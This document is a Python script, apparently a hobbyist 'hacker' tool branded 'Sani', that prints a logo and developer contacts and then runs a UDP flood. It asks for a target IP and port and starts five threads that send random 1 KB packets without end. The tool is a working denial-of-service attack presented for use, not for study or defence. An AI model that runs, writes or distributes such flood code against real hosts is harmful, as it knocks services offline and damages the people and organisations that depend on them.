# =====================================
#            Sani
# =====================================

import socket
import os
import threading
import sys
import time

# --------------------------------------------------------------
#  ANSI colour helpers (works on most terminals)
# --------------------------------------------------------------
class Colour:
    RED     = '\033[31m'
    GREEN   = '\033[32m'
    YELLOW  = '\033[33m'
    BLUE    = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN    = '\033[36m'
    WHITE   = '\033[37m'
    BOLD    = '\033[1m'
    RESET   = '\033[0m'

# --------------------------------------------------------------
#  1) Print a large "Sani" ASCII art logo
# --------------------------------------------------------------
def print_sani_logo():
    logo = f"""
{Colour.YELLOW}{Colour.BOLD}
  ██████╗ █████╗ ███╗   ██╗██╗
██╔════╝██╔══██╗████╗  ██║██║
███████╗███████║██╔██╗ ██║██║
╚════██║██╔══██║██║╚██╗██║██║
███████║██║  ██║██║ ╚████║██║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝
        S A N I
{Colour.RESET}
"""
    print(logo)

# --------------------------------------------------------------
#  2) Print developer & team details in colourful text
# --------------------------------------------------------------
def print_developer_info():
    name     = f"{Colour.CYAN}Name:{Colour.RESET} Saidul Islam Sani"
    facebook = f"{Colour.MAGENTA}Facebook:{Colour.RESET} https://www.facebook.com/profile.php?id=61577369692067"
    telegram = f"{Colour.GREEN}Telegram:{Colour.RESET} @jiolinhacker"
    team     = f"{Colour.WHITE}Team:{Colour.RESET} BPC (Full Colour)"

    print("\n".join([name, facebook, telegram, team]))
    print()
    # --------------------------------------------------------------
#  3) IP/Port validation
# --------------------------------------------------------------
def is_valid_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        if not part.isdigit() or not 0 <= int(part) <= 255:
            return False
    return True

# --------------------------------------------------------------
#  4) DoS attack function (UDP flood)
# --------------------------------------------------------------
def dos_attack(target_ip, target_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_buffer = os.urandom(1024)  # Random 1‑KB packet
        while True:
            sock.sendto(bytes_buffer, (target_ip, target_port))
            # Optional: comment out the line below to reduce console spam
            print(f"{Colour.RED}Sent packet to {target_ip}:{target_port}{Colour.RESET}")
    except Exception as e:
        print(f"{Colour.YELLOW}Error: {e}{Colour.RESET}")

# --------------------------------------------------------------
#  5) Main entry point
# --------------------------------------------------------------
def main():
    # 5.1 Show header / info
    print_sani_logo()
    print_developer_info()

    # 5.2 Gather user input
    target_ip = input('Enter target IP address: ').strip()
    if not is_valid_ip(target_ip):
        print(f"{Colour.YELLOW}Invalid IP address format. Exiting.{Colour.RESET}")
        return

    target_port_input = input('Enter target port (1-65535): ').strip()
    try:
        target_port = int(target_port_input)
        if not (1 <= target_port <= 65535):
            raise ValueError
    except ValueError:
        print(f"{Colour.YELLOW}Invalid port number. Exiting.{Colour.RESET}")
        return

    # 5.3 Start attack threads
    print(f"{Colour.GREEN}Starting attack on {target_ip}:{target_port}...{Colour.RESET}")
    threads = []
    for i in range(5):  # Default to 5 threads
        t = threading.Thread(target=dos_attack, args=(target_ip, target_port), daemon=True)
        t.start()
        threads.append(t)

    # Keep the main thread alive so the attack continues
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colour.YELLOW}Attack interrupted by user. Exiting.{Colour.RESET}")

# --------------------------------------------------------------
# 6) Entry guard
# --------------------------------------------------------------
if __name__ == '__main__':
    main()